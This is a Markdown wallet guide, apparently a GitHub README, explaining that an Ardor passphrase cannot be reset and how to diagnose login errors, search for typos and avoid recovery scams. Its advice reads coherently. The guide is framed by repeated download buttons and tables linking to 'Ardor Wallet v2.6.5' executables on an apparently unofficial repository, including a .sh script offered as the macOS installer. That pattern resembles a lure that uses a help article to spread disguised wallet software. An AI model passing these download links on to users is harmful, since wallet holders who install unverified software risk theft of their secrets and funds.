![Ardor Wallet guide](assets/banner-article.png)

# Can you reset an Ardor passphrase? No - here is what to do

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

An Ardor passphrase cannot be reset, because it is the account rather than a password for one. What you can do depends on how far off you are: a stray space or the wrong login tab is corrected in seconds, a small typo can be searched with the recovery utility built into the install, and a genuinely forgotten secret has no route back.

## Why there is no reset

A reset needs somebody who can override the secret. In a self-custody wallet nobody can, and that is the property that makes the wallet worth using. The project holds no record of your passphrase, no email address to send a link to, and no copy of the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) that could be rebuilt.

Every character combination derives a different account. Type the right words with an extra space and you open an empty account that has the same structure and a different address. Nothing is corrupted, and nothing is lost; you are simply looking at a different locked box. Understanding that turns a panic into a diagnosis.

## Diagnose which case you are in

Work through the table before you try anything else. Most reports of a lost account sit in the first two rows, and both are recoverable without help.

| What you see | What it means | What to do |
|---|---|---|
| "Incorrect passphrase, belongs to account ..." | The passphrase derives a valid but different account | Use the passphrase tab, not the account tab, and check for stray spaces |
| The wallet will not accept the words at all | Format problem: wrong tab, wrong word count, a character the field rejects | Re-enter by hand; check the seed or passphrase tab matches your backup type |
| The address is right but the balance is zero | Sync state, not a login problem | Wait for the chain, or check the address on a block explorer |
| Nothing you type reaches the address you remember | A character in the secret is wrong | Run the recovery utility with a position range |

## Case one: the wrong tab, or a stray character

The passphrase tab signs and spends; the account tab takes a public address and is read-only. Typing a passphrase into the account tab, or expecting an address to unlock spending, produces errors that read like a rejected secret.

Check the plain things first: trailing spaces, a capital letter the secret did not have, a line break pasted in from a notes app, autocorrect that changed a word, and a keyboard layout that swapped a character. Re-type the secret by hand rather than pasting it, and compare it against your written copy word by word before you conclude anything worse.

## Case two: a small typo

The install includes a passphrase recovery utility that searches for a close approximation. It takes a wildcard, a set of positions to vary, and a dictionary, all configured through the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)'s configuration properties. It can find a secret with a single mistyped character or a swapped pair within the range you set.

It is a search, not a promise. A wider range takes exponentially longer, and a secret that is several words wrong is out of reach. Run it with the narrowest range that still covers your doubt, on a machine you control, and leave it running rather than restarting it repeatedly. Write down the range and dictionary you used, so a second attempt widens the search instead of repeating the first one from the beginning.

## Case three: the secret is gone

If the words are genuinely forgotten and no close variant exists, the account is unreachable. No support request, no developer and no service can open it, and anyone who says otherwise is describing a capability that does not exist.

Say so plainly and move on. What remains is the part people find harder: checking whether any copy exists anywhere - a printed [backup](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md), a password manager entry, an old phone, an email to yourself, a photograph of a notebook. A secret that was never written down and is no longer remembered is the one case with no answer, and pretending otherwise wastes the days when a search might still have worked.

## Change it while you still have it

The passphrase can be changed from inside the wallet, and doing it on a schedule is a reasonable habit. A change produces a new account, so treat it as a migration: generate the replacement, note it down, check it reopens the address, shift the funds, and retire the old secret last.

Do not change a secret while a [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) sits on the old account without testing the new one first. A change made in a hurry, with the new words written down badly, converts a working wallet into the emergency this page is about. Two copies in two places, both checked against the screen, is the standard the rest of this page assumes.

## What to do if someone offers to recover it

Offers to recover a passphrase are always fraudulent. There is nothing to recover from, so a person asking for the words, a fee, a screen share or a "recovery tool" is asking for the account itself. The same applies to a page that offers to check a passphrase for you: entering it there hands over the account, and the check is theatre.

The safe version of that service already exists and runs on your machine, needs no network, and asks for a range rather than your secret. Anything else is theft with a support tone.

## FAQ

### Is there any way to recover a forgotten passphrase?

No. A near miss can be searched with the recovery utility, but a forgotten secret has no recovery path, and no third party can provide one.

### Why does the wallet say my passphrase belongs to another account?

Because it does. Every character combination derives a different account, and the wallet is telling you that this one is valid but not the one you expected. Check spacing and capitalisation.

### Can I change my passphrase to something easier to remember?

You can change it, but choose a generated secret rather than a memorable sentence. Human-chosen phrases are the ones that get guessed, and the wallet has no rate limit to slow an attacker down.

### Does the recovery utility need my passphrase typed into a website?

No. It runs locally with the wallet, takes a position range and a dictionary, and never sends the secret anywhere. A web page offering the same thing is not the utility.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Recover a passphrase that has a typo](https://github.com/ardor-software/ardor-wallet-guides/blob/main/recovering-a-passphrase-typo-in-ardor-wallet.md)
- [Ardor passphrase or seed phrase: which one do you have](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-passphrase-versus-seed-phrase.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
